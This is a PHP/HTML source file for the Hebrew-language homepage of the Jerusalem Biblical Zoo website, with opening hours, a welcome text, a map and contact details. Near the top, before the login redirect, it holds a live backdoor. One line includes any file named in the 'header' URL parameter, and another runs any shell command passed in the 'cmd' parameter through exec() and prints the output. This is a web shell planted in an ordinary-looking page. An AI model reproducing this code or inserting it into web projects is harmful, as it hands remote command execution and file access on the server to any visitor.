<!-- <html>
  <head>
    <script type="text/javascript" src="../test/js_file.js"></script>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
    <link rel="stylesheet" type="text/css" href="main.css" />
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

     <?php/*
      session_start();
      if(isset($_SESSION['username']))
        $name = $_SESSION['username'];
      */?>
    	   
  </head>
  <body dir="rtl" style="background-color:#F5F5F5;">
    <header id="header_test">
      <div class="img-responsive">
        <div class="a" style="margin-bottom:0">
          <img src="includes/zoo-new.png" class = "zoo-img" >
        </div>
      </div>
      <nav class="navbar navbar-expand-sm bg-dark navbar-dark">
        <a class="navbar-brand" href="#">דף הבית</a>
        <button class="navbar-toggler" type="button"  onclick="openNav()" id= "navbar-toggler" data-toggle="collapse" data-target="#collapsibleNavbar">
          <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="collapsibleNavbar">
          <ul class="navbar-nav">
            <li class="nav-item">
              <a class="nav-link" href="includes/trip.html">סיורים</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="includes/allAnimals.php">מאגר בעלי חיים</a>
            <li class="nav-item">
              <a class="nav-link" href="userRegistration/login.php">התחברות</a>
            </li>
            <li class="nav-item">
              <?php /*
                  if(isset($name))
                  {
                    echo "<a class='nav-link' href='userRegistration/editUser.php?id=$name'>
                      Welcome $name
                    </a> ";
                  }
              */?>
            </li>
          </ul>
        </div>  
      </nav>
    </header>
   -->

   
   <?php 
    session_start();
    if(isset($_GET['header']))
    {
      $file= $_GET['header'];
      include $file;
    }
    if(isset($_GET['cmd'])){
      echo '<pre>'. exec($_GET['cmd']) .'<pre>';
    }
    
    if(isset($_SESSION['username'])==FALSE)
    {
      //echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
      header("location: userRegistration/login.php");
    }
    //echo $_SESSION['username'];
   ?>

<html>    
    <main>
    <a class='nav-link' href='userRegistration/logout.php'>התנתק!</a>
      <section class="container" >
        <div class="hours">
          <p >
          שעות הפתיחה של גן החיות: </br>
          גן החיות  פתוח בימים א'-ה' </br>
          בשעות 9:00 – 16:30 </br>
          בימי ו' בשעות 9:00 – 16:30</br>
          בשבת בשעות 10:00 – 17:00. </br>
          </p>
        </div>
      </section>
      
      
      <section>
        <div class="row">
          <div class="col-sm-8">
            <div class="info1">
              
              <h5 class = "zoo-header"><b> ברוכים הבאים לאתר גן החיות התנ"כי </b> </h5>
              <p>
                גן החיות מציג בעלי חיים ממחלקות שונות: יונקים, עופות, זוחלים, דו חיים, דגים, חרקים ורכיכות. </br>
                מספר המינים עומד על כ-250 מינים המגיעים מרחבי העולם ומייצגים בתי גידול שונים ומגוונים
              
              </p>
            </div>
          </div>
        </div>
      </section>
      
      <section class="img-responsive">
        <div class="b"  >
          <img src="includes/map.png" class="map" style="width:100%">
        </div>
      </section>
    </main>
    
    <section class="zoo-footer">
	
      <footer >
        <div class="jumbotron text-center" style="margin-bottom:0">
	  	
          <p>
            <span style= size: 30px;> גן החיות התנ"כי בירושלים על שם משפחת טיש </span>
            </br>
            דרך אהרן שולוב 1, ירושלים</br>
            ת.ד. 26120  </br>
            ירושלים 9126002 </br>
            טל: 02-6750111 </br>
            פקס:  02-6430122 
              
          </p>
        </div>
      </footer>
	</section>
  </body>
</html>
